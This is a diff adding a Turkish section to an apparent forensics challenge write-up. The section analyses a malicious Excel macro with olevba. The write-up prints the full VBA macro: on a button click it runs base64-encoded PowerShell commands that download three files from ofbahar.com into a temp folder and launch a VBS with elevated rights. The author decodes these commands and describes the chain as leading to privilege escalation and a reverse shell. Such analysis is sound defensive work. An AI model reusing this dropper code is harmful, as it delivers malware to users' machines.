@@ -504,6 +504,107 @@ Bu dosyayı Rick Martin'in "Downloads" klasöründe bulabiliyoruz. Ayrıyeten Ou
 
 "BodyMassIndex.xlsm"
 
+Elimiz değmişken bunu da inceleyelim:) İncelemek için ```"oletools"``` paketi içerisinden ```"olevba.py"``` dosyasını kullanacağız.
+
+https://github.com/decalage2/oletools
+
+```
+┌──(root㉿kali)-[/home/kali/Desktop/oletools/oletools]
+└─# python olevba.py ../../Body\ Mass\ Index.xlsm 
+XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
+olevba 0.60.2dev1 on Python 3.11.1 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ../../Body Mass Index.xlsm
+Type: OpenXML
+WARNING  For now, VBA stomping cannot be detected for files in memory
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file: xl/vbaProject.bin - OLE stream: 'VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+    
+
+Sub Button1_Click()
+
+    Dim Boy As Long
+    Dim Kilo As Long
+    Dim Ara As Long
+    Dim WshShell, BtnCode
+    Set oshell = CreateObject("WScript.Shell")
+    Set WshShell = CreateObject("WScript.Shell")
+    Set shellapp = CreateObject("Shell.Application")
+    oshell.Run "powershell -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbwBmAGIAYQBoAGEAcgAuAGMAbwBtAC8AbgBvAHQAYQBtAGEAbAB3AGEAcgBlAC4AdgBiAHMAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABVAHMAZQByAHMAXABSAGkAYwBrAE0AYQByAHQAaQBuAEcAcgBpAG0AZQBzAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABuAG8AdABhAG0AYQBsAHcAYQByAGUALgB2AGIAcwA="
+    oshell.Run "powershell -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbwBmAGIAYQBoAGEAcgAuAGMAbwBtAC8AYQBjAGMAZQBzAHMAdABvAGsAZQBuAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABVAHMAZQByAHMAXABSAGkAYwBrAE0AYQByAHQAaQBuAEcAcgBpAG0AZQBzAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABBAGMAYwBlAHMAcwBUAG8AawBlAG4ALgBlAHgAZQA="
+    oshell.Run "powershell -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbwBmAGIAYQBoAGEAcgAuAGMAbwBtAC8AQgBvAGQAeQBNAGEAcwBzAEkAbgBkAGUAeAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVQBzAGUAcgBzAFwAUgBpAGMAawBNAGEAcgB0AGkAbgBHAHIAaQBtAGUAcwBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAQgBvAGQAeQBNAGEAcwBzAEkAbgBkAGUAeAAuAGUAeABlAA=="
+    
+    Application.Wait (Now + TimeValue("0:00:10"))
+    shellapp.ShellExecute "wscript.exe", "C:\Users\RickMartinGrimes\AppData\Local\Temp\notamalware.vbs", Null, "runas", 1
+    
+    BtnCode = WshShell.Popup("Please waiting, your BMI is calculating", 10, "Calculating...", 0 + 64)
+    
+    Boy = Range("C4").Value
+    Kilo = Range("C5").Value
+    Ara = (Boy / 100) * (Boy / 100)
+    Range("C6").Value = Kilo / Ara
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO ThisWorkbook.cls 
+in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Sheet1.cls 
+in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Button1_Click       |Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|WScript.Shell       |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Run                 |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|ShellExecute        |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|powershell          |May run PowerShell commands                  |
+|Suspicious|encodedcommand      |May run PowerShell commands                  |
+|Suspicious|CreateObject        |May create an OLE object                     |
+|Suspicious|Shell.Application   |May run an application (if combined with     |
+|          |                    |CreateObject)                                |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|IOC       |wscript.exe         |Executable file name                         |
+|IOC       |notamalware.vbs     |Executable file name                         |
++----------+--------------------+---------------------------------------------+
+```
+
+Butona tıklandığında, birkaç atama yapılmasıyla birlikte Base64 ile encode edilmiş Powershell komutları çalıştırılıyor.
+
+Hemen Decode edelim. Base64den çeviriyoruz ve Null Byte'ları temizliyoruz. 
+
+```Invoke-WebRequest -Uri http://ofbahar.com/notamalware.vbs -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\notamalware.vbs```
+```Invoke-WebRequest -Uri http://ofbahar.com/accesstoken.exe -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\AccessToken.exe```
+```Invoke-WebRequest -Uri http://ofbahar.com/BodyMassIndex.exe -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\BodyMassIndex.exe```
+
+Dosyalar indiriliyor, sonrasında aşağıdaki satırda "notamalware.vbs" dosyası çalıştırılıyor. 
+```
+    shellapp.ShellExecute "wscript.exe", "C:\Users\RickMartinGrimes\AppData\Local\Temp\notamalware.vbs", Null, "runas", 1
+```
+Çalışma Sırası:
+
+1- İlk önce Macro içeren Excel Dosyası Rick Martin tarafından çalıştırılıyor.<br>
+2- Daha sonrasında Macro tarafından 3 adet Malware indiriliyor.<br>
+3- Ardından "notamalware.vbs" dosyası çalıştırılıyor.<br>
+4- "notamalware.vbs" dosyası, ```"C:\Users\RickMartinGrimes\AppData\Local\Temp\"``` konumunda, ```notabadpowershell.ps1``` adında bir dosya oluşturuyor.<br>
+5- "notabadpowershell.ps1" dosyası ile, "AccessToken.exe" dosyası çalıştırılıyor.<br>
+6- "AccessToken.exe" dosyası privilege değerini yükseltiyor.<br>
+7- "AccessToken.exe" dosyası artık daha yüksek bir yetki değerine sahip. Sahip olduğu yetki değeri ile Reverse Shell içeren "BodyMassIndex.exe" dosyasını çalıştırıyor.<br>
+
 Cevap:
 ```
 "notamalware.vbs"
